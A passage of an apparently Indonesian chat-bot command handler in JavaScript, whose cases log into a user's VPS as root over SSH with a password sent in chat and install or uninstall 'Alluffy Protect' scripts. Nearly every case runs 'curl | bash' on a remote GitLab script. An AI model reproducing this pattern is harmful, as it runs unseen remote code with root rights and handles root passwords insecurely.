Reply(`✅ Instalasi Alluffy Protect 8 selesai!\n📦 Output terakhir:\n\`\`\`${cleanOutput}\`\`\``, m);
});
});
});

sshClient.on('error', (err) => {
Reply(`❌ Gagal terhubung ke VPS!\nPeriksa IP & Password kamu.\n\nError:\n${err.message}`, m);
});

sshClient.connect({
host: ipvps,
port: 22,
username: 'root',
password: pwvps,
readyTimeout: 20000
});
}
break;
// ────────────────────────────────
// 🔹 Case Install Protect 9 By Al Luffy
// ────────────────────────────────
case "installprotect9": {
if (!isCreator && !isOwnerProtect && !isSellerProtect) return Reply('❌ Hanya Creator, Owner Protect, atau Seller Protect yang bisa menggunakan perintah ini!', m);

if (!text.includes('|')) return Reply('❌ Salah format!\nGunakan seperti ini:\ninstallprotect9 ipvps|pwvps', m);
const [ipvps, pwvps] = text.split('|').map(a => a.trim());
if (!ipvps || !pwvps) return Reply('❌ Salah format!\nGunakan seperti ini:\ninstallprotect9 ipvps|pwvps', m);

const { Client: SSHClient } = require('ssh2');
const sshClient = new SSHClient();

const scriptURL = 'https://gitlab.com/alluffyofficial/installprotecpanel/-/raw/main/alluffyprotect9.sh';

Reply(`⏳ Menghubungkan ke VPS ${ipvps} dan mulai instalasi Alluffy Protect 9...`, m);

sshClient.on('ready', () => {
Reply('⚙️ Koneksi SSH berhasil! Proses instalasi sedang berjalan...', m);

sshClient.exec(`curl -fsSL ${scriptURL} | bash`, (err, stream) => {
if (err) {
sshClient.end();
return Reply(`❌ Gagal mengeksekusi perintah:\n${err.message}`, m);
}

let output = '';

stream.on('data', (data) => {
output += data.toString();
});

stream.stderr.on('data', (data) => {
output += `\n[ERROR] ${data.toString()}`;
});

stream.on('close', () => {
sshClient.end();
const cleanOutput = output.trim().slice(-3800) || '(tidak ada output)';
Reply(`✅ Instalasi Alluffy Protect 9 selesai!\n📦 Output terakhir:\n\`\`\`${cleanOutput}\`\`\``, m);
});
});
});

sshClient.on('error', (err) => {
Reply(`❌ Gagal terhubung ke VPS!\nPeriksa IP & Password kamu.\n\nError:\n${err.message}`, m);
});

sshClient.connect({
host: ipvps,
port: 22,
username: 'root',
password: pwvps,
readyTimeout: 20000
});
}
break;
// ────────────────────────────────
// 🔹 Case Install Protect 10 By Al Luffy
// ────────────────────────────────
case "installprotect10": {
if (!isCreator && !isOwnerProtect && !isSellerProtect) return Reply('❌ Hanya Creator, Owner Protect, atau Seller Protect yang bisa menggunakan perintah ini!', m);

if (!text.includes('|')) return Reply('❌ Salah format!\nGunakan seperti ini:\ninstallprotect10 ipvps|pwvps', m);
const [ipvps, pwvps] = text.split('|').map(a => a.trim());
if (!ipvps || !pwvps) return Reply('❌ Salah format!\nGunakan seperti ini:\ninstallprotect10 ipvps|pwvps', m);

const { Client: SSHClient } = require('ssh2');
const sshClient = new SSHClient();

const scriptURL = 'https://gitlab.com/alluffyofficial/installprotecpanel/-/raw/main/alluffyprotect10.sh';

Reply(`⏳ Menghubungkan ke VPS ${ipvps} dan mulai instalasi Alluffy Protect 10...`, m);

sshClient.on('ready', () => {
Reply('⚙️ Koneksi SSH berhasil! Proses instalasi sedang berjalan...', m);

sshClient.exec(`curl -fsSL ${scriptURL} | bash`, (err, stream) => {
if (err) {
sshClient.end();
return Reply(`❌ Gagal mengeksekusi perintah:\n${err.message}`, m);
}

let output = '';

stream.on('data', (data) => {
output += data.toString();
});

stream.stderr.on('data', (data) => {
output += `\n[ERROR] ${data.toString()}`;
});

stream.on('close', () => {
sshClient.end();
const cleanOutput = output.trim().slice(-3800) || '(tidak ada output)';
Reply(`✅ Instalasi Alluffy Protect 10 selesai!\n📦 Output terakhir:\n\`\`\`${cleanOutput}\`\`\``, m);
});
});
});

sshClient.on('error', (err) => {
Reply(`❌ Gagal terhubung ke VPS!\nPeriksa IP & Password kamu.\n\nError:\n${err.message}`, m);
});

sshClient.connect({
host: ipvps,
port: 22,
username: 'root',
password: pwvps,
readyTimeout: 20000
});
}
break;
// ────────────────────────────────
// 🔹 Case Install Protect 11 By Al Luffy
// ────────────────────────────────
case "installprotect11": {
if (!isCreator && !isOwnerProtect && !isSellerProtect) return Reply('❌ Hanya Creator, Owner Protect, atau Seller Protect yang bisa menggunakan perintah ini!', m);

if (!text.includes('|')) return Reply('❌ Salah format!\nGunakan seperti ini:\ninstallprotect11 ipvps|pwvps', m);
const [ipvps, pwvps] = text.split('|').map(a => a.trim());
if (!ipvps || !pwvps) return Reply('❌ Salah format!\nGunakan seperti ini:\ninstallprotect11 ipvps|pwvps', m);

const { Client: SSHClient } = require('ssh2');
const sshClient = new SSHClient();

const scriptURL = 'https://gitlab.com/alluffyofficial/installprotecpanel/-/raw/main/alluffyprotect11.sh';

Reply(`⏳ Menghubungkan ke VPS ${ipvps} dan mulai instalasi Alluffy Protect 11...`, m);

sshClient.on('ready', () => {
Reply('⚙️ Koneksi SSH berhasil! Proses instalasi sedang berjalan...', m);

sshClient.exec(`curl -fsSL ${scriptURL} | bash`, (err, stream) => {
if (err) {
sshClient.end();
return Reply(`❌ Gagal mengeksekusi perintah:\n${err.message}`, m);
}

let output = '';

stream.on('data', (data) => {
output += data.toString();
});

stream.stderr.on('data', (data) => {
output += `\n[ERROR] ${data.toString()}`;
});

stream.on('close', () => {
sshClient.end();
const cleanOutput = output.trim().slice(-3800) || '(tidak ada output)';
Reply(`✅ Instalasi Alluffy Protect 11 selesai!\n📦 Output terakhir:\n\`\`\`${cleanOutput}\`\`\``, m);
});
});
});

sshClient.on('error', (err) => {
Reply(`❌ Gagal terhubung ke VPS!\nPeriksa IP & Password kamu.\n\nError:\n${err.message}`, m);
});

sshClient.connect({
host: ipvps,
port: 22,
username: 'root',
password: pwvps,
readyTimeout: 20000
});
}
break;
// ────────────────────────────────
// 🔹 Case Install Protect 12 By Al Luffy
// ────────────────────────────────
case "installprotect12": {
if (!isCreator && !isOwnerProtect && !isSellerProtect) return Reply('❌ Hanya Creator, Owner Protect, atau Seller Protect yang bisa menggunakan perintah ini!', m);

if (!text.includes('|')) return Reply('❌ Salah format!\nGunakan seperti ini:\ninstallprotect12 ipvps|pwvps', m);
const [ipvps, pwvps] = text.split('|').map(a => a.trim());
if (!ipvps || !pwvps) return Reply('❌ Salah format!\nGunakan seperti ini:\ninstallprotect12 ipvps|pwvps', m);

const { Client: SSHClient } = require('ssh2');
const sshClient = new SSHClient();

const scriptURL = 'https://gitlab.com/alluffyofficial/installprotecpanel/-/raw/main/alluffyprotect12.sh';

Reply(`⏳ Menghubungkan ke VPS ${ipvps} dan mulai instalasi Alluffy Protect 12...`, m);

sshClient.on('ready', () => {
Reply('⚙️ Koneksi SSH berhasil! Proses instalasi sedang berjalan...', m);

sshClient.exec(`curl -fsSL ${scriptURL} | bash`, (err, stream) => {
if (err) {
sshClient.end();
return Reply(`❌ Gagal mengeksekusi perintah:\n${err.message}`, m);
}

let output = '';

stream.on('data', (data) => {
output += data.toString();
});

stream.stderr.on('data', (data) => {
output += `\n[ERROR] ${data.toString()}`;
});

stream.on('close', () => {
sshClient.end();
const cleanOutput = output.trim().slice(-3800) || '(tidak ada output)';
Reply(`✅ Instalasi Alluffy Protect 12 selesai!\n📦 Output terakhir:\n\`\`\`${cleanOutput}\`\`\``, m);
});
});
});

sshClient.on('error', (err) => {
Reply(`❌ Gagal terhubung ke VPS!\nPeriksa IP & Password kamu.\n\nError:\n${err.message}`, m);
});

sshClient.connect({
host: ipvps,
port: 22,
username: 'root',
password: pwvps,
readyTimeout: 20000
});
}
break;
// ────────────────────────────────
// 🔹 Case Install Protect 13 By Al Luffy
// ────────────────────────────────
case "installprotect13": {
if (!isCreator && !isOwnerProtect && !isSellerProtect) return Reply('❌ Hanya Creator, Owner Protect, atau Seller Protect yang bisa menggunakan perintah ini!', m);

if (!text.includes('|')) return Reply('❌ Salah format!\nGunakan seperti ini:\ninstallprotect13 ipvps|pwvps', m);
const [ipvps, pwvps] = text.split('|').map(a => a.trim());
if (!ipvps || !pwvps) return Reply('❌ Salah format!\nGunakan seperti ini:\ninstallprotect13 ipvps|pwvps', m);

const { Client: SSHClient } = require('ssh2');
const sshClient = new SSHClient();

const scriptURL = 'https://gitlab.com/alluffyofficial/installprotecpanel/-/raw/main/alluffyprotect13.sh';

Reply(`⏳ Menghubungkan ke VPS ${ipvps} dan mulai instalasi Alluffy Protect 13...`, m);

sshClient.on('ready', () => {
    Reply('⚙️ Koneksi SSH berhasil! Proses instalasi sedang berjalan...', m);

    sshClient.exec(`curl -fsSL ${scriptURL} | bash`, (err, stream) => {
        if (err) {
            sshClient.end();
            return Reply(`❌ Gagal mengeksekusi perintah:\n${err.message}`, m);
        }

        let output = '';

        stream.on('data', (data) => {
            output += data.toString();
        });

        stream.stderr.on('data', (data) => {
            output += `\n[ERROR] ${data.toString()}`;
        });

        stream.on('close', () => {
            sshClient.end();
            const cleanOutput = output.trim().slice(-3800) || '(tidak ada output)';
            Reply(`✅ Instalasi Alluffy Protect 13 selesai!\n📦 Output terakhir:\n\`\`\`${cleanOutput}\`\`\``, m);
        });
    });
});

sshClient.on('error', (err) => {
    Reply(`❌ Gagal terhubung ke VPS!\nPeriksa IP & Password kamu.\n\nError:\n${err.message}`, m);
});

sshClient.connect({
    host: ipvps,
    port: 22,
    username: 'root',
    password: pwvps,
    readyTimeout: 20000
});
}
break;
// ────────────────────────────────
// 🔹 Case Install Protect 14 By Al Luffy
// ────────────────────────────────
case "installprotect14": {
if (!isCreator && !isOwnerProtect && !isSellerProtect) return Reply('❌ Hanya Creator, Owner Protect, atau Seller Protect yang bisa menggunakan perintah ini!', m);

if (!text.includes('|')) return Reply('❌ Salah format!\nGunakan seperti ini:\ninstallprotect14 ipvps|pwvps', m);
const [ipvps, pwvps] = text.split('|').map(a => a.trim());
if (!ipvps || !pwvps) return Reply('❌ Salah format!\nGunakan seperti ini:\ninstallprotect14 ipvps|pwvps', m);

const { Client: SSHClient } = require('ssh2');
const sshClient = new SSHClient();

const scriptURL = 'https://gitlab.com/alluffyofficial/installprotecpanel/-/raw/main/alluffyprotect14.sh';

Reply(`⏳ Menghubungkan ke VPS ${ipvps} dan mulai instalasi Alluffy Protect 14...`, m);

sshClient.on('ready', () => {
    Reply('⚙️ Koneksi SSH berhasil! Proses instalasi sedang berjalan...', m);

    sshClient.exec(`curl -fsSL ${scriptURL} | bash`, (err, stream) => {
        if (err) {
            sshClient.end();
            return Reply(`❌ Gagal mengeksekusi perintah:\n${err.message}`, m);
        }

        let output = '';

        stream.on('data', (data) => {
            output += data.toString();
        });

        stream.stderr.on('data', (data) => {
            output += `\n[ERROR] ${data.toString()}`;
        });

        stream.on('close', () => {
            sshClient.end();
            const cleanOutput = output.trim().slice(-3800) || '(tidak ada output)';
            Reply(`✅ Instalasi Alluffy Protect 14 selesai!\n📦 Output terakhir:\n\`\`\`${cleanOutput}\`\`\``, m);
        });
    });
});

sshClient.on('error', (err) => {
    Reply(`❌ Gagal terhubung ke VPS!\nPeriksa IP & Password kamu.\n\nError:\n${err.message}`, m);
});

sshClient.connect({
    host: ipvps,
    port: 22,
    username: 'root',
    password: pwvps,
    readyTimeout: 20000
});
}
break;
// ────────────────────────────────
// 🔹 Case Install Protect 15 By Al Luffy
// ────────────────────────────────
case "installprotect15": {
if (!isCreator && !isOwnerProtect && !isSellerProtect) return Reply('❌ Hanya Creator, Owner Protect, atau Seller Protect yang bisa menggunakan perintah ini!', m);

if (!text.includes('|')) return Reply('❌ Salah format!\nGunakan seperti ini:\ninstallprotect15 ipvps|pwvps', m);
const [ipvps, pwvps] = text.split('|').map(a => a.trim());
if (!ipvps || !pwvps) return Reply('❌ Salah format!\nGunakan seperti ini:\ninstallprotect15 ipvps|pwvps', m);

const { Client: SSHClient } = require('ssh2');
const sshClient = new SSHClient();

const scriptURL = 'https://gitlab.com/alluffyofficial/installprotecpanel/-/raw/main/alluffyprotect15.sh';

Reply(`⏳ Menghubungkan ke VPS ${ipvps} dan mulai instalasi Alluffy Protect 15...`, m);

sshClient.on('ready', () => {
    Reply('⚙️ Koneksi SSH berhasil! Proses instalasi sedang berjalan...', m);

    sshClient.exec(`curl -fsSL ${scriptURL} | bash`, (err, stream) => {
        if (err) {
            sshClient.end();
            return Reply(`❌ Gagal mengeksekusi perintah:\n${err.message}`, m);
        }

        let output = '';

        stream.on('data', (data) => {
            output += data.toString();
        });

        stream.stderr.on('data', (data) => {
            output += `\n[ERROR] ${data.toString()}`;
        });

        stream.on('close', () => {
            sshClient.end();
            const cleanOutput = output.trim().slice(-3800) || '(tidak ada output)';
            Reply(`✅ Instalasi Alluffy Protect 15 selesai!\n📦 Output terakhir:\n\`\`\`${cleanOutput}\`\`\``, m);
        });
    });
});

sshClient.on('error', (err) => {
    Reply(`❌ Gagal terhubung ke VPS!\nPeriksa IP & Password kamu.\n\nError:\n${err.message}`, m);
});

sshClient.connect({
    host: ipvps,
    port: 22,
    username: 'root',
    password: pwvps,
    readyTimeout: 20000
});
}
break;
// ────────────────────────────────
// 🔹 Case Install Protect 16 By Al Luffy
// ────────────────────────────────
case "installprotect16": {
if (!isCreator && !isOwnerProtect && !isSellerProtect) return Reply('❌ Hanya Creator, Owner Protect, atau Seller Protect yang bisa menggunakan perintah ini!', m);

if (!text.includes('|')) return Reply('❌ Salah format!\nGunakan seperti ini:\ninstallprotect16 ipvps|pwvps', m);
const [ipvps, pwvps] = text.split('|').map(a => a.trim());
if (!ipvps || !pwvps) return Reply('❌ Salah format!\nGunakan seperti ini:\ninstallprotect16 ipvps|pwvps', m);

const { Client: SSHClient } = require('ssh2');
const sshClient = new SSHClient();

const scriptURL = 'https://gitlab.com/alluffyofficial/installprotecpanel/-/raw/main/alluffyprotect16.sh';

Reply(`⏳ Menghubungkan ke VPS ${ipvps} dan mulai instalasi Alluffy Protect 16...`, m);

sshClient.on('ready', () => {
    Reply('⚙️ Koneksi SSH berhasil! Proses instalasi sedang berjalan...', m);

    sshClient.exec(`curl -fsSL ${scriptURL} | bash`, (err, stream) => {
        if (err) {
            sshClient.end();
            return Reply(`❌ Gagal mengeksekusi perintah:\n${err.message}`, m);
        }

        let output = '';

        stream.on('data', (data) => {
            output += data.toString();
        });

        stream.stderr.on('data', (data) => {
            output += `\n[ERROR] ${data.toString()}`;
        });

        stream.on('close', () => {
            sshClient.end();
            const cleanOutput = output.trim().slice(-3800) || '(tidak ada output)';
            Reply(`✅ Instalasi Alluffy Protect 16 selesai!\n📦 Output terakhir:\n\`\`\`${cleanOutput}\`\`\``, m);
        });
    });
});

sshClient.on('error', (err) => {
    Reply(`❌ Gagal terhubung ke VPS!\nPeriksa IP & Password kamu.\n\nError:\n${err.message}`, m);
});

sshClient.connect({
    host: ipvps,
    port: 22,
    username: 'root',
    password: pwvps,
    readyTimeout: 20000
});
}
break;
// ────────────────────────────────
// 🔹 Case Install Protect All By Al Luffy
// ────────────────────────────────
case "installprotectall": {
 if (!isCreator && !isOwnerProtect && !isSellerProtect) return Reply('❌ Hanya Creator, Owner Protect, atau Seller Protect yang bisa menggunakan perintah ini!', m);

 if (!text.includes('|')) return Reply('❌ Salah format!\nGunakan seperti ini:\n*installprotectall ipvps|pwvps*', m);
 const [ipvps, pwvps] = text.split('|').map(a => a.trim());
 if (!ipvps || !pwvps) return Reply('❌ Salah format!\nGunakan seperti ini:\n*installprotectall ipvps|pwvps*', m);

 const { Client: SSHClient } = require('ssh2');
 const sshClient = new SSHClient();

 const scripts = [
 'alluffyprotect1.sh',
 'alluffyprotect2.sh',
 'alluffyprotect3.sh',
 'alluffyprotect4.sh',
 'alluffyprotect5.sh',
 'alluffyprotect6.sh',
 'alluffyprotect7.sh',
 'alluffyprotect8.sh',
 'alluffyprotect9.sh',
 'alluffyprotect10.sh',
 'alluffyprotect11.sh',
 'alluffyprotect12.sh',
 'alluffyprotect13.sh',
 'alluffyprotect14.sh',
 'alluffyprotect15.sh',
 'alluffyprotect16.sh'
 ];

 Reply(`⏳ Menghubungkan ke VPS *${ipvps}* dan mulai instalasi Alluffy Protect 1-16...`, m);

 sshClient.on('ready', async () => {
 Reply('⚙️ Koneksi SSH berhasil! Proses instalasi semua Alluffy Protect sedang berjalan...', m);

 for (let i = 0; i < scripts.length; i++) {
 const script = scripts[i];
 const scriptURL = `https://gitlab.com/alluffyofficial/installprotecpanel/-/raw/main/${script}`;
 Reply(`🚀 Memulai instalasi *${script}* (${i + 1}/${scripts.length})...\n🔗 ${scriptURL}`, m);

 await new Promise((resolve) => {
 sshClient.exec(`curl -fsSL ${scriptURL} | bash`, (err, stream) => {
 if (err) {
 Reply(`❌ Gagal mengeksekusi ${script}:\n\`${err.message}\``, m);
 return resolve();
 }

 let output = '';
 stream.on('data', (data) => {
 output += data.toString();
 });
 stream.stderr.on('data', (data) => {
 output += `\n[ERROR] ${data.toString()}`;
 });
 stream.on('close', () => {
 const clean = output.trim().slice(-3800) || '(tidak ada output)';
 Reply(`✅ *${script} selesai!*\n📦 Output terakhir:\n\`\`\`${clean}\`\`\``, m);
 resolve();
 });
 });
 });
 }

 sshClient.end();
 Reply('🎉 Semua instalasi Alluffy Protect 1-16 selesai!', m);
 });

 sshClient.on('error', (err) => {
 Reply(`❌ Gagal terhubung ke VPS!\nPeriksa IP & Password kamu.\n\nError:\n\`${err.message}\``, m);
 });

 sshClient.connect({
 host: ipvps,
 port: 22,
 username: 'root',
 password: pwvps,
 readyTimeout: 20000
 });
}
break
// ────────────────────────────────
// 🔹 Case Uninstall Protect 1 By Al Luffy
// ────────────────────────────────
case "uninstallprotect1": {
    if (!isCreator && !isOwnerProtect && !isSellerProtect) return Reply('❌ Hanya Creator, Owner Protect, atau Seller Protect yang bisa menggunakan perintah ini!', m);

    if (!text.includes('|')) return Reply('❌ Salah format!\nGunakan seperti ini:\n*uninstallprotect1 ipvps|pwvps*', m);
    const [ipvps, pwvps] = text.split('|').map(a => a.trim());
    if (!ipvps || !pwvps) return Reply('❌ Salah format!\nGunakan seperti ini:\n*uninstallprotect1 ipvps|pwvps*', m);

    const { Client: SSHClient } = require('ssh2');
    const sshClient = new SSHClient();

    // URL Bash Uninstall
    const scriptURL = 'https://gitlab.com/alluffyofficial/uninstallprotecpanel/-/raw/main/alluffyprotect1.sh';

    Reply(`⏳ Menghubungkan ke VPS *${ipvps}* dan mulai proses Uninstall Alluffy Protect 1...`, m);

    sshClient.on('ready', () => {
        Reply('⚙️ Koneksi SSH berhasil! Proses uninstall sedang berjalan...', m);

        sshClient.exec(`curl -fsSL ${scriptURL} | bash`, (err, stream) => {
            if (err) {
                sshClient.end();
                return Reply(`❌ Gagal mengeksekusi perintah:\n\`${err.message}\``, m);
            }

            let output = '';

            stream.on('data', (data) => {
                output += data.toString();
            });

            stream.stderr.on('data', (data) => {
                output += `\n[ERROR] ${data.toString()}`;
            });

            stream.on('close', () => {
                sshClient.end();
                const cleanOutput = output.trim().slice(-3800) || '(tidak ada output)';
                Reply(`✅ *Uninstall Alluffy Protect 1 selesai!*\n📦 Output terakhir:\n\`\`\`${cleanOutput}\`\`\``, m);
            });
        });
    });

    sshClient.on('error', (err) => {
        Reply(`❌ Gagal terhubung ke VPS!\nPeriksa IP & Password kamu.\n\nError:\n\`${err.message}\``, m);
    });

    sshClient.connect({
        host: ipvps,
        port: 22,
        username: 'root',
        password: pwvps,
        readyTimeout: 20000
    });
}
break;
// ────────────────────────────────
// 🔹 Case Uninstall Protect 2 By Al Luffy
// ────────────────────────────────
case "uninstallprotect2": {
    if (!isCreator && !isOwnerProtect && !isSellerProtect) return Reply('❌ Hanya Creator, Owner Protect, atau Seller Protect yang bisa menggunakan perintah ini!', m);

    if (!text.includes('|')) return Reply('❌ Salah format!\nGunakan seperti ini:\n*uninstallprotect2 ipvps|pwvps*', m);
    const [ipvps, pwvps] = text.split('|').map(a => a.trim());
    if (!ipvps || !pwvps) return Reply('❌ Salah format!\nGunakan seperti ini:\n*uninstallprotect2 ipvps|pwvps*', m);

    const { Client: SSHClient } = require('ssh2');
    const sshClient = new SSHClient();

    // URL Bash Uninstall Protect 2
    const scriptURL = 'https://gitlab.com/alluffyofficial/uninstallprotecpanel/-/raw/main/alluffyprotect2.sh';

    Reply(`⏳ Menghubungkan ke VPS *${ipvps}* dan mulai proses Uninstall Alluffy Protect 2...`, m);

    sshClient.on('ready', () => {
        Reply('⚙️ Koneksi SSH berhasil! Proses uninstall sedang berjalan...', m);

        sshClient.exec(`curl -fsSL ${scriptURL} | bash`, (err, stream) => {
            if (err) {
                sshClient.end();
                return Reply(`❌ Gagal mengeksekusi perintah:\n\`${err.message}\``, m);
            }

            let output = '';

            stream.on('data', (data) => {
                output += data.toString();
            });

            stream.stderr.on('data', (data) => {
                output += `\n[ERROR] ${data.toString()}`;
            });

            stream.on('close', () => {
                sshClient.end();
                const cleanOutput = output.trim().slice(-3800) || '(tidak ada output)';
                Reply(`✅ *Uninstall Alluffy Protect 2 selesai!*\n📦 Output terakhir:\n\`\`\`${cleanOutput}\`\`\``, m);
            });
        });
    });

    sshClient.on('error', (err) => {
        Reply(`❌ Gagal terhubung ke VPS!\nPeriksa IP & Password kamu.\n\nError:\n\`${err.message}\``, m);
    });

    sshClient.connect({
        host: ipvps,
        port: 22,
        username: 'root',
        password: pwvps,
        readyTimeout: 20000
    });
}
break;
// ────────────────────────────────
// 🔹 Case Uninstall Protect 3 By Al Luffy
// ────────────────────────────────
case "uninstallprotect3": {
    if (!isCreator && !isOwnerProtect && !isSellerProtect) return Reply('❌ Hanya Creator, Owner Protect, atau Seller Protect yang bisa menggunakan perintah ini!', m);

    if (!text.includes('|')) return Reply('❌ Salah format!\nGunakan seperti ini:\n*uninstallprotect3 ipvps|pwvps*', m);
    const [ipvps, pwvps] = text.split('|').map(a => a.trim());
    if (!ipvps || !pwvps) return Reply('❌ Salah format!\nGunakan seperti ini:\n*uninstallprotect3 ipvps|pwvps*', m);

    const { Client: SSHClient } = require('ssh2');
    const sshClient = new SSHClient();

    // URL Bash Uninstall Protect 3
    const scriptURL = 'https://gitlab.com/alluffyofficial/uninstallprotecpanel/-/raw/main/alluffyprotect3.sh';

    Reply(`⏳ Menghubungkan ke VPS *${ipvps}* dan mulai proses Uninstall Alluffy Protect 3...`, m);

    sshClient.on('ready', () => {
        Reply('⚙️ Koneksi SSH berhasil! Proses uninstall sedang berjalan...', m);

        sshClient.exec(`curl -fsSL ${scriptURL} | bash`, (err, stream) => {
            if (err) {
                sshClient.end();
                return Reply(`❌ Gagal mengeksekusi perintah:\n\`${err.message}\``, m);
            }

            let output = '';

            stream.on('data', (data) => {
                output += data.toString();
            });

            stream.stderr.on('data', (data) => {
                output += `\n[ERROR] ${data.toString()}`;
            });

            stream.on('close', () => {
                sshClient.end();
                const cleanOutput = output.trim().slice(-3800) || '(tidak ada output)';
                Reply(`✅ *Uninstall Alluffy Protect 3 selesai!*\n📦 Output terakhir:\n\`\`\`${cleanOutput}\`\`\``, m);
            });
        });
    });

    sshClient.on('error', (err) => {
        Reply(`❌ Gagal terhubung ke VPS!\nPeriksa IP & Password kamu.\n\nError:\n\`${err.message}\``, m);
    });

    sshClient.connect({
        host: ipvps,
        port: 22,
        username: 'root',
        password: pwvps,
        readyTimeout: 20000
    });
}
break;
// ────────────────────────────────
// 🔹 Case Uninstall Protect 4 By Al Luffy
// ────────────────────────────────
case "uninstallprotect4": {
    if (!isCreator && !isOwnerProtect && !isSellerProtect) return Reply('❌ Hanya Creator, Owner Protect, atau Seller Protect yang bisa menggunakan perintah ini!', m);

    if (!text.includes('|')) return Reply('❌ Salah format!\nGunakan seperti ini:\n*uninstallprotect4 ipvps|pwvps*', m);
    const [ipvps, pwvps] = text.split('|').map(a => a.trim());
    if (!ipvps || !pwvps) return Reply('❌ Salah format!\nGunakan seperti ini:\n*uninstallprotect4 ipvps|pwvps*', m);

    const { Client: SSHClient } = require('ssh2');
    const sshClient = new SSHClient();

    const scriptURL = 'https://gitlab.com/alluffyofficial/uninstallprotecpanel/-/raw/main/alluffyprotect4.sh';

    Reply(`⏳ Menghubungkan ke VPS *${ipvps}* dan mulai proses Uninstall Alluffy Protect 4...`, m);

    sshClient.on('ready', () => {
        Reply('⚙️ Koneksi SSH berhasil! Proses uninstall sedang berjalan...', m);

        sshClient.exec(`curl -fsSL ${scriptURL} | bash`, (err, stream) => {
            if (err) {
                sshClient.end();
                return Reply(`❌ Gagal mengeksekusi perintah:\n\`${err.message}\``, m);
            }

            let output = '';

            stream.on('data', (data) => {
                output += data.toString();
            });

            stream.stderr.on('data', (data) => {
                output += `\n[ERROR] ${data.toString()}`;
            });

            stream.on('close', () => {
                sshClient.end();
                const cleanOutput = output.trim().slice(-3800) || '(tidak ada output)';
                Reply(`✅ *Uninstall Alluffy Protect 4 selesai!*\n📦 Output terakhir:\n\`\`\`${cleanOutput}\`\`\``, m);
            });
        });
    });

    sshClient.on('error', (err) => {
        Reply(`❌ Gagal terhubung ke VPS!\nPeriksa IP & Password kamu.\n\nError:\n\`${err.message}\``, m);
    });

    sshClient.connect({
        host: ipvps,
        port: 22,
        username: 'root',
        password: pwvps,
        readyTimeout: 20000
    });
}
break;
// ────────────────────────────────
// 🔹 Case Uninstall Protect 5 By Al Luffy
// ────────────────────────────────
case "uninstallprotect5": {
    if (!isCreator && !isOwnerProtect && !isSellerProtect) return Reply('❌ Hanya Creator, Owner Protect, atau Seller Protect yang bisa menggunakan perintah ini!', m);

    if (!text.includes('|')) return Reply('❌ Salah format!\nGunakan seperti ini:\n*uninstallprotect5 ipvps|pwvps*', m);
    const [ipvps, pwvps] = text.split('|').map(a => a.trim());
    if (!ipvps || !pwvps) return Reply('❌ Salah format!\nGunakan seperti ini:\n*uninstallprotect5 ipvps|pwvps*', m);

    const { Client: SSHClient } = require('ssh2');
    const sshClient = new SSHClient();

    const scriptURL = 'https://gitlab.com/alluffyofficial/uninstallprotecpanel/-/raw/main/alluffyprotect5.sh';

    Reply(`⏳ Menghubungkan ke VPS *${ipvps}* dan mulai proses Uninstall Alluffy Protect 5...`, m);

    sshClient.on('ready', () => {
        Reply('⚙️ Koneksi SSH berhasil! Proses uninstall sedang berjalan...', m);

        sshClient.exec(`curl -fsSL ${scriptURL} | bash`, (err, stream) => {
            if (err) {
                sshClient.end();
                return Reply(`❌ Gagal mengeksekusi perintah:\n\`${err.message}\``, m);
            }

            let output = '';

            stream.on('data', (data) => {
                output += data.toString();
            });

            stream.stderr.on('data', (data) => {
                output += `\n[ERROR] ${data.toString()}`;
            });

            stream.on('close', () => {
                sshClient.end();
                const cleanOutput = output.trim().slice(-3800) || '(tidak ada output)';
                Reply(`✅ *Uninstall Alluffy Protect 5 selesai!*\n📦 Output terakhir:\n\`\`\`${cleanOutput}\`\`\``, m);
            });
        });
    });

    sshClient.on('error', (err) => {
        Reply(`❌ Gagal terhubung ke VPS!\nPeriksa IP & Password kamu.\n\nError:\n\`${err.message}\``, m);
    });

    sshClient.connect({
        host: ipvps,
        port: 22,
        username: 'root',
        password: pwvps,
        readyTimeout: 20000
    });
}
break;
// ────────────────────────────────
// 🔹 Case Uninstall Protect 6 By Al Luffy
// ────────────────────────────────
case "uninstallprotect6": {
    if (!isCreator && !isOwnerProtect && !isSellerProtect) return Reply('❌ Hanya Creator, Owner Protect, atau Seller Protect yang bisa menggunakan perintah ini!', m);

    if (!text.includes('|')) return Reply('❌ Salah format!\nGunakan seperti ini:\n*uninstallprotect6 ipvps|pwvps*', m);
    const [ipvps, pwvps] = text.split('|').map(a => a.trim());
    if (!ipvps || !pwvps) return Reply('❌ Salah format!\nGunakan seperti ini:\n*uninstallprotect6 ipvps|pwvps*', m);

    const { Client: SSHClient } = require('ssh2');
    const sshClient = new SSHClient();

    const scriptURL = 'https://gitlab.com/alluffyofficial/uninstallprotecpanel/-/raw/main/alluffyprotect6.sh';

    Reply(`⏳ Menghubungkan ke VPS *${ipvps}* dan mulai proses Uninstall Alluffy Protect 6...`, m);

    sshClient.on('ready', () => {
        Reply('⚙️ Koneksi SSH berhasil! Proses uninstall sedang berjalan...', m);

        sshClient.exec(`curl -fsSL ${scriptURL} | bash`, (err, stream) => {
            if (err) {
                sshClient.end();
                return Reply(`❌ Gagal mengeksekusi perintah:\n\`${err.message}\``, m);
            }

            let output = '';

            stream.on('data', (data) => {
                output += data.toString();
            });

            stream.stderr.on('data', (data) => {
                output += `\n[ERROR] ${data.toString()}`;
            });

            stream.on('close', () => {
                sshClient.end();
                const cleanOutput = output.trim().slice(-3800) || '(tidak ada output)';
                Reply(`✅ *Uninstall Alluffy Protect 6 selesai!*\n📦 Output terakhir:\n\`\`\`${cleanOutput}\`\`\``, m);
            });
        });
    });

    sshClient.on('error', (err) => {
        Reply(`❌ Gagal terhubung ke VPS!\nPeriksa IP & Password kamu.\n\nError:\n\`${err.message}\``, m);
    });

    sshClient.connect({
        host: ipvps,
        port: 22,
        username: 'root',
        password: pwvps,
        readyTimeout: 20000
    });
}
break;
// ────────────────────────────────
// 🔹 Case Uninstall Protect 7 By Al Luffy
// ────────────────────────────────
case "uninstallprotect7": {
    if (!isCreator && !isOwnerProtect && !isSellerProtect) return Reply('❌ Hanya Creator, Owner Protect, atau Seller Protect yang bisa menggunakan perintah ini!', m);

    if (!text.includes('|')) return Reply('❌ Salah format!\nGunakan seperti ini:\n*uninstallprotect7 ipvps|pwvps*', m);
    const [ipvps, pwvps] = text.split('|').map(a => a.trim());
    if (!ipvps || !pwvps) return Reply('❌ Salah format!\nGunakan seperti ini:\n*uninstallprotect7 ipvps|pwvps*', m);

    const { Client: SSHClient } = require('ssh2');
    const sshClient = new SSHClient();

    const scriptURL = 'https://gitlab.com/alluffyofficial/uninstallprotecpanel/-/raw/main/alluffyprotect7.sh';

